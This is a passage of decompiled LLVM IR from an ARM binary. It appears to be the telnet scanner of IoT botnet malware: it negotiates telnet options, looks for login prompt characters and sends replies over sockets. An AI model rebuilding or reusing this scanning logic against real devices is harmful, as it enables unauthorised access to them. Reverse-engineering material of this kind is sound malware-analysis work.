  %v0_11334 = load i32, i32* @r8, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11334 = icmp eq i32 %v0_11334, 0
  store i1 %v2_11334, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11334, label %dec_label_pc_10b88.loopexit, label %dec_label_pc_10d28

dec_label_pc_11340:                               ; preds = %dec_label_pc_10c0c
  %v1_11340 = add i32 %v0_10c0c, 24
  %v2_11340 = inttoptr i32 %v1_11340 to i32*
  %v3_11340 = load i32, i32* %v2_11340, align 4
  store i32 %v3_11340, i32* %r1.global-to-local, align 4
  %v1_11344 = add i32 %v3_11340, -1
  store i32 %v1_11344, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11348 = icmp eq i32 %v1_11344, 0
  store i1 %v2_11348, i1* %cpsr_z.global-to-local, align 1
  %tmp404 = icmp slt i32 %v1_11344, 1
  br i1 %tmp404, label %dec_label_pc_113ac, label %dec_label_pc_11350

dec_label_pc_11350:                               ; preds = %dec_label_pc_11340
  %v2_11350 = add i32 %v1_11344, %v0_10c0c
  store i32 %v2_11350, i32* %r3.global-to-local, align 4
  %v1_11354 = add i32 %v2_11350, 28
  %v2_11354 = inttoptr i32 %v1_11354 to i8*
  %v3_11354 = load i8, i8* %v2_11354, align 1
  %v4_11354 = zext i8 %v3_11354 to i32
  store i32 %v4_11354, i32* %r3.global-to-local, align 4
  %v2_11358 = icmp ugt i8 %v3_11354, 61
  store i1 %v2_11358, i1* %cpsr_c.global-to-local, align 1
  %v7_11358 = icmp eq i8 %v3_11354, 62
  store i1 %v7_11358, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11358, label %dec_label_pc_11554, label %bb405

bb405:                                            ; preds = %dec_label_pc_11350
  %v3_1135c = icmp ugt i8 %v3_11354, 57
  store i1 %v3_1135c, i1* %cpsr_c.global-to-local, align 1
  %v8_1135c = icmp eq i8 %v3_11354, 58
  store i1 %v8_1135c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_1135c, label %dec_label_pc_11554, label %dec_label_pc_11364

dec_label_pc_11364:                               ; preds = %bb405
  %v2_11364 = icmp ugt i8 %v3_11354, 35
  store i1 %v2_11364, i1* %cpsr_c.global-to-local, align 1
  %v7_11364 = icmp eq i8 %v3_11354, 36
  store i1 %v7_11364, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11364, label %dec_label_pc_11554, label %dec_label_pc_1136c

dec_label_pc_1136c:                               ; preds = %dec_label_pc_11364
  %v2_1136c = icmp ugt i8 %v3_11354, 34
  store i1 %v2_1136c, i1* %cpsr_c.global-to-local, align 1
  %v7_1136c = icmp eq i8 %v3_11354, 35
  store i1 %v7_1136c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1136c, label %dec_label_pc_11554, label %dec_label_pc_113a4.preheader

dec_label_pc_113a4.preheader:                     ; preds = %dec_label_pc_1136c
  %v3_11370 = add i32 %v0_10c0c, 28
  %v2_11374 = add i32 %v3_11370, %v3_11340
  store i32 %v2_11374, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_113a4

dec_label_pc_11380:                               ; preds = %dec_label_pc_113a4
  %v1_11380 = add i32 %v0_1139c, -2
  %v2_11380 = inttoptr i32 %v1_11380 to i8*
  %v3_11380 = load i8, i8* %v2_11380, align 1
  %v4_11380 = zext i8 %v3_11380 to i32
  store i32 %v4_11380, i32* %r2.global-to-local, align 4
  %v2_11384 = icmp ugt i8 %v3_11380, 61
  store i1 %v2_11384, i1* %cpsr_c.global-to-local, align 1
  %v7_11384 = icmp eq i8 %v3_11380, 62
  store i1 %v7_11384, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11384, label %dec_label_pc_11554, label %bb406

bb406:                                            ; preds = %dec_label_pc_11380
  %v3_11388 = icmp ugt i8 %v3_11380, 57
  store i1 %v3_11388, i1* %cpsr_c.global-to-local, align 1
  %v8_11388 = icmp eq i8 %v3_11380, 58
  store i1 %v8_11388, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11388, label %dec_label_pc_11554, label %dec_label_pc_11390

dec_label_pc_11390:                               ; preds = %bb406
  %v2_11390 = icmp ugt i8 %v3_11380, 35
  store i1 %v2_11390, i1* %cpsr_c.global-to-local, align 1
  %v7_11390 = icmp eq i8 %v3_11380, 36
  store i1 %v7_11390, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11390, label %dec_label_pc_11554, label %dec_label_pc_11398

dec_label_pc_11398:                               ; preds = %dec_label_pc_11390
  %v2_11398 = icmp ugt i8 %v3_11380, 34
  store i1 %v2_11398, i1* %cpsr_c.global-to-local, align 1
  %v7_11398 = icmp eq i8 %v3_11380, 35
  store i1 %v7_11398, i1* %cpsr_z.global-to-local, align 1
  %v1_1139c = add i32 %v0_1139c, -1
  store i32 %v1_1139c, i32* %r3.global-to-local, align 4
  br i1 %v7_11398, label %dec_label_pc_11554, label %dec_label_pc_113a4

dec_label_pc_113a4:                               ; preds = %dec_label_pc_113a4.preheader, %dec_label_pc_11398
  %v0_1139c = phi i32 [ %v2_11374, %dec_label_pc_113a4.preheader ], [ %v1_1139c, %dec_label_pc_11398 ]
  %v0_113a4 = phi i32 [ %v1_11344, %dec_label_pc_113a4.preheader ], [ %v1_113a4, %dec_label_pc_11398 ]
  %v1_113a4 = add i32 %v0_113a4, -1
  store i32 %v1_113a4, i32* %r0.global-to-local, align 4
  %v2_113a4 = icmp ne i32 %v0_113a4, 0
  store i1 %v2_113a4, i1* %cpsr_c.global-to-local, align 1
  %v7_113a4 = icmp eq i32 %v0_113a4, 1
  store i1 %v7_113a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_113a4, label %dec_label_pc_113ac, label %dec_label_pc_11380

dec_label_pc_113ac:                               ; preds = %dec_label_pc_113a4, %dec_label_pc_11340
  %v0_113ac = load i32, i32* @fp, align 4
  store i32 %v0_113ac, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1b688.334 to i32), i32* %r2.global-to-local, align 4
  store i32 7, i32* %r3.global-to-local, align 4
  %v5_113b8 = call i32 @util_memsearch(i32 %v0_113ac, i32 %v3_11340, i32 ptrtoint ([8 x i8]* @global_var_1b688.334 to i32), i32 7)
  store i32 %v5_113b8, i32* %r0.global-to-local, align 4
  %v2_113bc = icmp eq i32 %v5_113b8, -1
  store i1 %v2_113bc, i1* %cpsr_c.global-to-local, align 1
  %v7_113bc = icmp eq i32 %v5_113b8, -1
  store i1 %v7_113bc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_113b8, i32* @r8, align 4
  br i1 %v7_113bc, label %dec_label_pc_10b88.loopexit, label %dec_label_pc_113c8

dec_label_pc_113c8:                               ; preds = %dec_label_pc_113ac
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_113c8 = icmp eq i32 %v5_113b8, 0
  store i1 %v2_113c8, i1* %cpsr_z.global-to-local, align 1
  %tmp407 = icmp slt i32 %v5_113b8, 1
  br i1 %tmp407, label %dec_label_pc_11334, label %dec_label_pc_113c8.dec_label_pc_11558_crit_edge

dec_label_pc_113c8.dec_label_pc_11558_crit_edge:  ; preds = %dec_label_pc_113c8
  %v0_11558.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_11558

dec_label_pc_113d4:                               ; preds = %dec_label_pc_10c0c
  %v1_113d4 = add i32 %v0_10c0c, 24
  %v2_113d4 = inttoptr i32 %v1_113d4 to i32*
  %v3_113d4 = load i32, i32* %v2_113d4, align 4
  store i32 %v3_113d4, i32* %r2.global-to-local, align 4
  %v0_113d8 = load i32, i32* @fp, align 4
  store i32 %v0_113d8, i32* @r4, align 4
  store i32 0, i32* @r8, align 4
  %v3_113e0141 = icmp eq i32 %v3_113d4, 0
  store i1 %v3_113e0141, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_113e0141, i1* %cpsr_z.global-to-local, align 1
  %v6_113e4148 = icmp sgt i32 %v3_113d4, 0
  br i1 %v6_113e4148, label %dec_label_pc_113e8.preheader, label %dec_label_pc_11494

dec_label_pc_113e0.loopexit:                      ; preds = %dec_label_pc_11404
  %v2_1140c = add i32 %v1_1140c, 2
  store i32 %v2_1140c, i32* @r4, align 4
  %v2_11410 = add i32 %v1_11410, 2
  store i32 %v2_11410, i32* @r8, align 4
  %v3_113e0 = icmp uge i32 %v2_11410, %v1_113e0
  store i1 %v3_113e0, i1* %cpsr_c.global-to-local, align 1
  %v9_113e0 = icmp eq i32 %v2_11410, %v1_113e0
  store i1 %v9_113e0, i1* %cpsr_z.global-to-local, align 1
  %v6_113e4 = icmp slt i32 %v2_11410, %v1_113e0
  br i1 %v6_113e4, label %dec_label_pc_113e8.preheader, label %dec_label_pc_11494

dec_label_pc_113e8.preheader:                     ; preds = %dec_label_pc_113d4, %dec_label_pc_113e0.loopexit
  %v6_1149c225 = phi i32 [ %v6_1149c226, %dec_label_pc_113e0.loopexit ], [ %v0_10c0c, %dec_label_pc_113d4 ]
  %v1_11410214 = phi i32 [ %v2_11410, %dec_label_pc_113e0.loopexit ], [ 0, %dec_label_pc_113d4 ]
  %v1_113f4212 = phi i32 [ %v1_113e0, %dec_label_pc_113e0.loopexit ], [ %v3_113d4, %dec_label_pc_113d4 ]
  %v0_113e8210 = phi i32 [ %v2_1140c, %dec_label_pc_113e0.loopexit ], [ %v0_113d8, %dec_label_pc_113d4 ]
  br label %dec_label_pc_113e8

dec_label_pc_113e8:                               ; preds = %dec_label_pc_113e8.preheader, %dec_label_pc_11478
  %v6_1149c226 = phi i32 [ %v6_1149c225, %dec_label_pc_113e8.preheader ], [ %v0_11480, %dec_label_pc_11478 ]
  %v1_11410 = phi i32 [ %v1_11410214, %dec_label_pc_113e8.preheader ], [ %v1_11484, %dec_label_pc_11478 ]
  %v1_113e0 = phi i32 [ %v1_113f4212, %dec_label_pc_113e8.preheader ], [ %v3_11480, %dec_label_pc_11478 ]
  %v1_1140c = phi i32 [ %v0_113e8210, %dec_label_pc_113e8.preheader ], [ %v1_1148c, %dec_label_pc_11478 ]
  %v1_113e8 = inttoptr i32 %v1_1140c to i8*
  %v2_113e8 = load i8, i8* %v1_113e8, align 1
  %v3_113e8 = zext i8 %v2_113e8 to i32
  store i32 %v3_113e8, i32* @r3, align 4
  %v2_113ec = icmp eq i8 %v2_113e8, -1
  store i1 %v2_113ec, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_113ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_113ec, label %dec_label_pc_113f4, label %dec_label_pc_11494

dec_label_pc_113f4:                               ; preds = %dec_label_pc_113e8
  %v0_113f4 = load i32, i32* @fp, align 4
  %v2_113f4 = add i32 %v0_113f4, %v1_113e0
  store i32 %v2_113f4, i32* %r1.global-to-local, align 4
  %v1_113f8 = add i32 %v1_1140c, 1
  store i32 %v1_113f8, i32* @r5, align 4
  %v3_113fc = icmp uge i32 %v2_113f4, %v1_113f8
  store i1 %v3_113fc, i1* %cpsr_c.global-to-local, align 1
  %v9_113fc = icmp eq i32 %v2_113f4, %v1_113f8
  store i1 %v9_113fc, i1* %cpsr_z.global-to-local, align 1
  %v2_11400 = xor i1 %v3_113fc, true
  %v3_11400 = or i1 %v9_113fc, %v2_11400
  br i1 %v3_11400, label %dec_label_pc_11494, label %dec_label_pc_11404

dec_label_pc_11404:                               ; preds = %dec_label_pc_113f4
  %v2_11404 = inttoptr i32 %v1_113f8 to i8*
  %v3_11404 = load i8, i8* %v2_11404, align 1
  %v4_11404 = zext i8 %v3_11404 to i32
  store i32 %v4_11404, i32* @r3, align 4
  %v2_11408 = icmp eq i8 %v3_11404, -1
  store i1 %v2_11408, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_11408, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11408, label %dec_label_pc_113e0.loopexit, label %dec_label_pc_11418

dec_label_pc_11418:                               ; preds = %dec_label_pc_11404
  %v2_11418 = icmp ugt i8 %v3_11404, -4
  store i1 %v2_11418, i1* %cpsr_c.global-to-local, align 1
  %v7_11418 = icmp eq i8 %v3_11404, -3
  store i1 %v7_11418, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11418, label %dec_label_pc_114a4, label %dec_label_pc_11420

dec_label_pc_11420:                               ; preds = %dec_label_pc_11418
  %v1_11420 = add i32 %v1_1140c, 2
  store i32 %v1_11420, i32* @r3, align 4
  %v3_11424 = icmp uge i32 %v2_113f4, %v1_11420
  store i1 %v3_11424, i1* %cpsr_c.global-to-local, align 1
  %v9_11424 = icmp eq i32 %v2_113f4, %v1_11420
  store i1 %v9_11424, i1* %cpsr_z.global-to-local, align 1
  %v2_11428 = xor i1 %v3_11424, true
  %v3_11428 = or i1 %v9_11424, %v2_11428
  br i1 %v3_11428, label %dec_label_pc_11494, label %dec_label_pc_1142c

dec_label_pc_1142c:                               ; preds = %dec_label_pc_11508, %bb412, %.thread111, %dec_label_pc_11420
  %v0_1142c = load i32, i32* @r5, align 4
  %v1_1142c = inttoptr i32 %v0_1142c to i8*
  %v2_1142c = load i8, i8* %v1_1142c, align 1
  %v3_1142c = zext i8 %v2_1142c to i32
  store i32 %v3_1142c, i32* %r3.global-to-local, align 4
  %v2_11430 = icmp ugt i8 %v2_1142c, -4
  store i1 %v2_11430, i1* %cpsr_c.global-to-local, align 1
  %v7_11430 = icmp eq i8 %v2_1142c, -3
  store i1 %v7_11430, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11430, label %.thread103, label %dec_label_pc_11440

.thread103:                                       ; preds = %dec_label_pc_1142c
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v1_1142c, align 1
  %v0_1143c.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1143c.pr.pr, label %.thread106, label %.thread103.dec_label_pc_11440thread-pre-split_crit_edge

.thread103.dec_label_pc_11440thread-pre-split_crit_edge: ; preds = %.thread103
  %v0_11440.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11440

dec_label_pc_11440:                               ; preds = %dec_label_pc_1142c, %.thread103.dec_label_pc_11440thread-pre-split_crit_edge
  %v0_11440.pr = phi i32 [ %v0_11440.pr.pre, %.thread103.dec_label_pc_11440thread-pre-split_crit_edge ], [ %v3_1142c, %dec_label_pc_1142c ]
  %v2_11440 = icmp ugt i32 %v0_11440.pr, 250
  store i1 %v2_11440, i1* %cpsr_c.global-to-local, align 1
  %v7_11440 = icmp eq i32 %v0_11440.pr, 251
  store i1 %v7_11440, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11440, label %bb408, label %.thread106

bb408:                                            ; preds = %dec_label_pc_11440
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_11448 = load i32, i32* @r5, align 4
  %v4_11448 = inttoptr i32 %v3_11448 to i8*
  store i8 -3, i8* %v4_11448, align 1
  br label %.thread106

.thread106:                                       ; preds = %dec_label_pc_11440, %.thread103, %bb408
  %v0_1144c = load i32, i32* @r4, align 4
  %v1_1144c = add i32 %v0_1144c, 2
  %v2_1144c = inttoptr i32 %v1_1144c to i8*
  %v3_1144c = load i8, i8* %v2_1144c, align 1
  %v4_1144c = zext i8 %v3_1144c to i32
  store i32 %v4_1144c, i32* %r3.global-to-local, align 4
  %v2_11450 = icmp ugt i8 %v3_1144c, -4
  store i1 %v2_11450, i1* %cpsr_c.global-to-local, align 1
  %v7_11450 = icmp eq i8 %v3_1144c, -3
  store i1 %v7_11450, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11450, label %.thread107, label %dec_label_pc_11460

.thread107:                                       ; preds = %.thread106
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v2_1144c, align 1
  %v0_1145c.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1145c.pr.pr, label %.thread110, label %.thread107.dec_label_pc_11460thread-pre-split_crit_edge

.thread107.dec_label_pc_11460thread-pre-split_crit_edge: ; preds = %.thread107
  %v0_11460.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11460

dec_label_pc_11460:                               ; preds = %.thread106, %.thread107.dec_label_pc_11460thread-pre-split_crit_edge
  %v0_11460.pr = phi i32 [ %v0_11460.pr.pre, %.thread107.dec_label_pc_11460thread-pre-split_crit_edge ], [ %v4_1144c, %.thread106 ]
  %v2_11460 = icmp ugt i32 %v0_11460.pr, 250
  store i1 %v2_11460, i1* %cpsr_c.global-to-local, align 1
  %v7_11460 = icmp eq i32 %v0_11460.pr, 251
  store i1 %v7_11460, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11460, label %bb409, label %.thread110

bb409:                                            ; preds = %dec_label_pc_11460
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_11468 = load i32, i32* @r4, align 4
  %v4_11468 = add i32 %v3_11468, 2
  %v5_11468 = inttoptr i32 %v4_11468 to i8*
  store i8 -3, i8* %v5_11468, align 1
  br label %.thread110

.thread110:                                       ; preds = %dec_label_pc_11460, %.thread107, %bb409
  %v0_1146c = load i32, i32* @r6, align 4
  %v1_1146c = add i32 %v0_1146c, 4
  %v2_1146c = inttoptr i32 %v1_1146c to i32*
  %v3_1146c = load i32, i32* %v2_1146c, align 4
  store i32 %v3_1146c, i32* %r0.global-to-local, align 4
  %v0_11470 = load i32, i32* @r4, align 4
  br label %dec_label_pc_11478

dec_label_pc_11478:                               ; preds = %dec_label_pc_116a4, %.thread110
  %v0_1147c = phi i32 [ %v3_116b8, %dec_label_pc_116a4 ], [ %v3_1146c, %.thread110 ]
  %storemerge4 = phi i32 [ %v2_114bc, %dec_label_pc_116a4 ], [ %v0_11470, %.thread110 ]
  %storemerge = phi i32 [ 9, %dec_label_pc_116a4 ], [ 3, %.thread110 ]
  store i32 %storemerge4, i32* %r1.global-to-local, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_1147c = call i32 @__libc_send(i32 %v0_1147c, i32 %storemerge4, i32 %storemerge, i32 16384)
  store i32 %v4_1147c, i32* %r0.global-to-local, align 4
  %v0_11480 = load i32, i32* @r6, align 4
  %v1_11480 = add i32 %v0_11480, 24
  %v2_11480 = inttoptr i32 %v1_11480 to i32*
  %v3_11480 = load i32, i32* %v2_11480, align 4
  store i32 %v3_11480, i32* %r2.global-to-local, align 4
  %v0_11484 = load i32, i32* @r8, align 4
  %v1_11484 = add i32 %v0_11484, 3
  store i32 %v1_11484, i32* @r8, align 4
  %v3_11488 = icmp uge i32 %v1_11484, %v3_11480
  store i1 %v3_11488, i1* %cpsr_c.global-to-local, align 1
  %v9_11488 = icmp eq i32 %v1_11484, %v3_11480
  store i1 %v9_11488, i1* %cpsr_z.global-to-local, align 1
  %v0_1148c = load i32, i32* @r4, align 4
  %v1_1148c = add i32 %v0_1148c, 3
  store i32 %v1_1148c, i32* @r4, align 4
  %v5_11490 = icmp slt i32 %v1_11484, %v3_11480
  br i1 %v5_11490, label %dec_label_pc_113e8, label %dec_label_pc_11494

dec_label_pc_11494:                               ; preds = %dec_label_pc_113e0.loopexit, %dec_label_pc_113e8, %dec_label_pc_11478, %dec_label_pc_11420, %dec_label_pc_113f4, %dec_label_pc_113d4, %dec_label_pc_114a4.dec_label_pc_11494.loopexit_crit_edge
  %v6_1149c = phi i32 [ %v0_114d4, %dec_label_pc_114a4.dec_label_pc_11494.loopexit_crit_edge ], [ %v0_10c0c, %dec_label_pc_113d4 ], [ %v6_1149c226, %dec_label_pc_113e8 ], [ %v0_11480, %dec_label_pc_11478 ], [ %v6_1149c226, %dec_label_pc_11420 ], [ %v6_1149c226, %dec_label_pc_113f4 ], [ %v6_1149c226, %dec_label_pc_113e0.loopexit ]
  %v0_11494 = phi i32 [ %v0_11494.pre.pre, %dec_label_pc_114a4.dec_label_pc_11494.loopexit_crit_edge ], [ 0, %dec_label_pc_113d4 ], [ %v1_11410, %dec_label_pc_113e8 ], [ %v1_11484, %dec_label_pc_11478 ], [ %v1_11410, %dec_label_pc_11420 ], [ %v1_11410, %dec_label_pc_113f4 ], [ %v2_11410, %dec_label_pc_113e0.loopexit ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11494 = icmp eq i32 %v0_11494, 0
  store i1 %v2_11494, i1* %cpsr_z.global-to-local, align 1
  %tmp410 = icmp slt i32 %v0_11494, 1
  br i1 %tmp410, label %dec_label_pc_11334, label %bb411

bb411:                                            ; preds = %dec_label_pc_11494
  store i32 3, i32* @r3, align 4
  %v7_1149c = add i32 %v6_1149c, 12
  %v8_1149c = inttoptr i32 %v7_1149c to i32*
  store i32 3, i32* %v8_1149c, align 4
  br label %dec_label_pc_11334

dec_label_pc_114a4:                               ; preds = %dec_label_pc_11418
  store i32 %v2_114a8, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_1b699.336 to i32), i32* @r1, align 4
  store i32 3, i32* @r2, align 4
  store i32 %v2_114a8, i32* @r0, align 4
  store i32 %v2_114bc, i32* @sl, align 4
  %v0_114c0 = call i32 @memcpy()
  store i32 9, i32* @r2, align 4
  store i32 %v2_114bc, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1b690.338 to i32), i32* @r1, align 4
  %v0_114d0 = call i32 @memcpy()
  store i32 %v0_114d0, i32* %r0.global-to-local, align 4
  %v0_114d4 = load i32, i32* @r6, align 4
  %v1_114d4 = add i32 %v0_114d4, 24
  %v2_114d4 = inttoptr i32 %v1_114d4 to i32*
  %v3_114d4 = load i32, i32* %v2_114d4, align 4
  %v0_114d8 = load i32, i32* @r4, align 4
  %v1_114d8 = add i32 %v0_114d8, 2
  store i32 %v1_114d8, i32* %r2.global-to-local, align 4
  %v0_114dc = load i32, i32* @fp, align 4
  %v2_114dc = add i32 %v0_114dc, %v3_114d4
  store i32 %v2_114dc, i32* @r3, align 4
  %v3_114e0 = icmp uge i32 %v2_114dc, %v1_114d8
  store i1 %v3_114e0, i1* %cpsr_c.global-to-local, align 1
  %v9_114e0 = icmp eq i32 %v2_114dc, %v1_114d8
  store i1 %v9_114e0, i1* %cpsr_z.global-to-local, align 1
  %v2_114e4 = xor i1 %v3_114e0, true
  %v3_114e4 = or i1 %v9_114e0, %v2_114e4
  br i1 %v3_114e4, label %dec_label_pc_114a4.dec_label_pc_11494.loopexit_crit_edge, label %dec_label_pc_114e8

dec_label_pc_114a4.dec_label_pc_11494.loopexit_crit_edge: ; preds = %dec_label_pc_114a4
  %v0_11494.pre.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_11494

dec_label_pc_114e8:                               ; preds = %dec_label_pc_114a4
  %v2_114e8 = inttoptr i32 %v1_114d8 to i8*
  %v3_114e8 = load i8, i8* %v2_114e8, align 1
  %v4_114e8 = zext i8 %v3_114e8 to i32
  store i32 %v4_114e8, i32* %r3.global-to-local, align 4
  %v2_114ec = icmp ugt i8 %v3_114e8, 30
  store i1 %v2_114ec, i1* %cpsr_c.global-to-local, align 1
  %v7_114ec = icmp eq i8 %v3_114e8, 31
  store i1 %v7_114ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_114ec, label %dec_label_pc_116a4, label %dec_label_pc_114f4

dec_label_pc_114f4:                               ; preds = %dec_label_pc_114e8
  %v1_114f4 = inttoptr i32 %v0_114d8 to i8*
  %v2_114f4 = load i8, i8* %v1_114f4, align 1
  %v3_114f4 = zext i8 %v2_114f4 to i32
  store i32 %v3_114f4, i32* %r3.global-to-local, align 4
  %v2_114f8 = icmp ugt i8 %v2_114f4, -4
  store i1 %v2_114f8, i1* %cpsr_c.global-to-local, align 1
  %v7_114f8 = icmp eq i8 %v2_114f4, -3
  store i1 %v7_114f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_114f8, label %.thread111, label %dec_label_pc_11508

.thread111:                                       ; preds = %dec_label_pc_114f4
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v1_114f4, align 1
  %v0_11504.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11504.pr.pr, label %dec_label_pc_1142c, label %.thread111.dec_label_pc_11508thread-pre-split_crit_edge

.thread111.dec_label_pc_11508thread-pre-split_crit_edge: ; preds = %.thread111
  %v0_11508.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11508

dec_label_pc_11508:                               ; preds = %dec_label_pc_114f4, %.thread111.dec_label_pc_11508thread-pre-split_crit_edge
  %v0_11508.pr = phi i32 [ %v0_11508.pr.pre, %.thread111.dec_label_pc_11508thread-pre-split_crit_edge ], [ %v3_114f4, %dec_label_pc_114f4 ]
  %v2_11508 = icmp ugt i32 %v0_11508.pr, 250
  store i1 %v2_11508, i1* %cpsr_c.global-to-local, align 1
  %v7_11508 = icmp eq i32 %v0_11508.pr, 251
  store i1 %v7_11508, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11508, label %bb412, label %dec_label_pc_1142c

bb412:                                            ; preds = %dec_label_pc_11508
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_11510 = load i32, i32* @r4, align 4
  %v4_11510 = inttoptr i32 %v3_11510 to i8*
  store i8 -3, i8* %v4_11510, align 1
  br label %dec_label_pc_1142c

dec_label_pc_11518:                               ; preds = %dec_label_pc_112dc, %dec_label_pc_112fc, %dec_label_pc_112f4, %dec_label_pc_112ec, %bb403, %dec_label_pc_112c8, %dec_label_pc_112a4, %dec_label_pc_112c0, %dec_label_pc_112b8, %bb402
  %v0_11518 = phi i32 [ %v1_11298, %dec_label_pc_112c8 ], [ %v1_11298, %dec_label_pc_112a4 ], [ %v1_11298, %dec_label_pc_112c0 ], [ %v1_11298, %dec_label_pc_112b8 ], [ %v1_11298, %bb402 ], [ %v1_11308, %bb403 ], [ %v1_11308, %dec_label_pc_112ec ], [ %v1_11308, %dec_label_pc_112f4 ], [ %v1_11308, %dec_label_pc_112fc ], [ %v1_11308, %dec_label_pc_112dc ]
  %v1_11518 = add i32 %v0_11518, 1
  store i32 %v1_11518, i32* @r8, align 4
  br label %dec_label_pc_1151c

dec_label_pc_1151c:                               ; preds = %dec_label_pc_1132c.dec_label_pc_1151c_crit_edge, %dec_label_pc_11518
  %v0_1151c = phi i32 [ %v0_1151c.pre, %dec_label_pc_1132c.dec_label_pc_1151c_crit_edge ], [ %v0_10c0c, %dec_label_pc_11518 ]
  %v1_1151c = inttoptr i32 %v0_1151c to i32*
  %v2_1151c = load i32, i32* %v1_1151c, align 4
  store i32 %v2_1151c, i32* %r3.global-to-local, align 4
  %v1_11520 = add i32 %v0_1151c, 4
  %v2_11520 = inttoptr i32 %v1_11520 to i32*
  %v3_11520 = load i32, i32* %v2_11520, align 4
  store i32 %v3_11520, i32* %r0.global-to-local, align 4
  %v1_11524 = add i32 %v2_1151c, 12
  %v2_11524 = inttoptr i32 %v1_11524 to i8*
  %v3_11524 = load i8, i8* %v2_11524, align 1
  %v4_11524 = zext i8 %v3_11524 to i32
  store i32 %v4_11524, i32* %r2.global-to-local, align 4
  %v1_11528 = inttoptr i32 %v2_1151c to i32*
  %v2_11528 = load i32, i32* %v1_11528, align 4
  store i32 %v2_11528, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_11530 = call i32 @__libc_send(i32 %v3_11520, i32 %v2_11528, i32 %v4_11524, i32 16384)
  store i32 %v4_11530, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11538 = load i32, i32* @r6, align 4
  %v1_11538 = add i32 %v0_11538, 4
  %v2_11538 = inttoptr i32 %v1_11538 to i32*
  %v3_11538 = load i32, i32* %v2_11538, align 4
  store i32 %v3_11538, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b3dc.43 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_11544 = call i32 @__libc_send(i32 %v3_11538, i32 ptrtoint ([3 x i8]* @global_var_1b3dc.43 to i32), i32 2, i32 16384)
  store i32 %v4_11544, i32* %r0.global-to-local, align 4
  store i32 4, i32* @r3, align 4
  %v1_1154c = load i32, i32* @r6, align 4
  %v2_1154c = add i32 %v1_1154c, 12
  %v3_1154c = inttoptr i32 %v2_1154c to i32*
  store i32 4, i32* %v3_1154c, align 4
  br label %dec_label_pc_11334

dec_label_pc_11554:                               ; preds = %dec_label_pc_11380, %dec_label_pc_11398, %dec_label_pc_11390, %bb406, %dec_label_pc_1136c, %dec_label_pc_11350, %dec_label_pc_11364, %bb405
  %v0_11554 = phi i32 [ %v1_11344, %dec_label_pc_1136c ], [ %v1_11344, %dec_label_pc_11350 ], [ %v1_11344, %dec_label_pc_11364 ], [ %v1_11344, %bb405 ], [ %v1_113a4, %bb406 ], [ %v1_113a4, %dec_label_pc_11390 ], [ %v1_113a4, %dec_label_pc_11398 ], [ %v1_113a4, %dec_label_pc_11380 ]
  %v1_11554 = add i32 %v0_11554, 1
  store i32 %v1_11554, i32* @r8, align 4
  br label %dec_label_pc_11558

dec_label_pc_11558:                               ; preds = %dec_label_pc_113c8.dec_label_pc_11558_crit_edge, %dec_label_pc_11554
  %v0_11558 = phi i32 [ %v0_11558.pre, %dec_label_pc_113c8.dec_label_pc_11558_crit_edge ], [ %v0_10c0c, %dec_label_pc_11554 ]
  %v1_11558 = inttoptr i32 %v0_11558 to i32*
  %v2_11558 = load i32, i32* %v1_11558, align 4
  store i32 %v2_11558, i32* %r3.global-to-local, align 4
  %v1_1155c = add i32 %v0_11558, 4
  %v2_1155c = inttoptr i32 %v1_1155c to i32*
  %v3_1155c = load i32, i32* %v2_1155c, align 4
  store i32 %v3_1155c, i32* %r0.global-to-local, align 4
